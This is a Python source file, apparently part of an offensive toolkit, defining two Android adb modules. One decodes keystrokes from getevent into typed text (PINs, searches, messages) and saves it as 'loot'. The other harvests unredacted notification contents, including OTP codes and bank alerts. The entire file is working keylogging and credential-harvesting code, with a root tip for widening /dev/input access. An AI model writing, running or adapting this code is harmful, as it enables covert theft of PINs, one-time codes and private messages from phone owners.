"""The two live streams a screenshot hides: keystrokes and notifications.

* ``android.keylog`` — a bounded ``getevent`` capture decoded back into the
  text that was typed on the phone (PINs, searches, messages). Touch events are
  kept in the log too, so a coordinate burst can be replayed later.
* ``android.notify`` — the notification shade with ``--noredact``, which on a
  debugging-enabled device is the full title *and* body of every notification:
  OTP codes, bank alerts, chat previews.

Both are passive: nothing is installed, nothing is injected.
"""

from __future__ import annotations

import json
import os
import time

from omni.android import events
from omni.android.modules._base import AndroidModule
from omni.core import config, console
from omni.core.module import Option

__all__ = ["Keylog", "Notify"]


class Keylog(AndroidModule):
    NAME = "android.keylog"
    DESCRIPTION = "Decode typed text from the input event stream (getevent)"
    OPTIONS = (Option("SECONDS", "capture window", "30"),
               Option("DEVICE", "only this input device, e.g. event3"),
               Option("OUT", "log path (defaults to loot)"))

    def execute(self) -> dict:
        client = self.adb()
        seconds = max(1, self.get_int("SECONDS", 30))
        path = os.path.expanduser(
            self.get("OUT") or
            os.path.join(config.output_dir("android/keylog"),
                         f"keys_{time.strftime('%Y%m%d_%H%M%S')}.log"))
        os.makedirs(os.path.dirname(path), exist_ok=True)
        console.info(f"capturing input events for {seconds}s — type on the "
                     f"device now")
        res = client.raw("shell", "timeout", str(seconds), "getevent", "-lt",
                         timeout=seconds + 30)
        raw = res.out or (res.text if res.ok else "")
        if not raw.strip():
            raise RuntimeError(
                "no events captured — unlock the phone, or grant shell read "
                "access to /dev/input (root: chmod 644 /dev/input/event*)")

        parsed = events.parse_getevent(raw)
        device = self.get("DEVICE").strip()
        if device:
            parsed = [e for e in parsed if device.lower() in e.device.lower()]
        typed = events.decode_text(parsed)
        counts = events.key_counts(parsed)

        with open(path, "w", encoding="utf-8", newline="\n") as fh:
            fh.write(f"# captured {time.strftime('%Y-%m-%dT%H:%M:%S')} "
                     f"({len(parsed)} events)\n")
            fh.write(f"# typed: {typed!r}\n")
            for name, count in counts.items():
                fh.write(f"# {name}\t{count}\n")
            fh.write(raw if raw.endswith("\n") else raw + "\n")

        if typed:
            console.ok(f"typed text: {typed!r}")
        else:
            console.warn("no printable keys — only touches/volume keys seen")
        console.table(["key", "presses"],
                      [[k, str(v)] for k, v in list(counts.items())[:20]])
        console.ok(f"{len(parsed)} event(s) -> {path}")
        return {"events": len(parsed), "typed": typed, "keys": counts,
                "path": path}


class Notify(AndroidModule):
    NAME = "android.notify"
    DESCRIPTION = "Harvest the notification shade (packages, titles, bodies)"
    OPTIONS = (Option("ACTION", "list|save", "list",
                       choices=("list", "save")),
               Option("PACKAGE", "only this package"),
               Option("GREP", "only rows containing this text"),
               Option("LIMIT", "rows to print", "40"),
               Option("OUT", "JSON path for ACTION=save"))

    def execute(self) -> dict:
        client = self.adb()
        out = client.shell_result("dumpsys", "notification", "--noredact",
                                  timeout=120).out
        notices = events.parse_notifications(out)
        package = self.get("PACKAGE").strip().lower()
        needle = self.get("GREP").strip().lower()
        if package:
            notices = [n for n in notices
                       if package in n["package"].lower()]
        if needle:
            notices = [n for n in notices
                       if needle in f"{n['title']} {n['text']} "
                                    f"{n['package']}".lower()]
        if not notices:
            console.warn("nothing in the shade — or the dump returned no "
                         "--noredact extras (Android 11+ redacts without it)")
            return {"notifications": []}

        console.table(["package", "title", "text"],
                      events.notification_rows(notices,
                                               self.get_int("LIMIT", 40)))
        result: dict = {"notifications": notices,
                        "packages": sorted({n["package"] for n in notices})}
        if self.get("ACTION") == "save":
            path = os.path.expanduser(
                self.get("OUT") or
                os.path.join(config.output_dir("android/notify"),
                             f"shade_{time.strftime('%Y%m%d_%H%M%S')}.json"))
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, "w", encoding="utf-8", newline="\n") as fh:
                fh.write(json.dumps(notices, indent=2) + "\n")
            result["path"] = path
            console.info(f"saved {len(notices)} record(s) -> {path}")
        console.ok(f"{len(notices)} notification(s) from "
                   f"{len(result['packages'])} app(s)")
        return result
